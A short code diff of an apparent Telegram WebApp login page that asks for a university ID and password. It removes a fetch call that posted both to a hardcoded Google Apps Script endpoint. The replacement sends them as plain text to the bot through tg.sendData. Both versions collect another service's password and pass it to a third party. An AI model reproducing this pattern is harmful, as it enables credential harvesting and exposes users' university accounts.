@@ -191,8 +191,6 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzZRsRqfoZCGf4dxkZJZPzJY4c8gRK2INKszgjdXsoRFO7IE-rSs6BLTNvD34r32IY/exec";
-
         function toggleTheme() {
             const body = document.body;
             const currentTheme = body.getAttribute('data-theme');
@@ -209,27 +207,13 @@
 
         function sendData(event) {
             event.preventDefault();
-            const btn = document.getElementById('subBtn');
             const uniId = document.getElementById('uniId').value.trim();
             const password = document.getElementById('password').value.trim();
             
             if(!uniId || !password) return;
-            
-            btn.innerText = "جاري الإرسال والربط...";
-            btn.disabled = true;
 
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ uniId: uniId, password: password })
-            })
-            .then(() => {
-                tg.close();
-            })
-            .catch(() => {
-                tg.close();
-            });
+            tg.sendData(uniId + " " + password);
+            tg.close();
         }
     </script>
 </body>
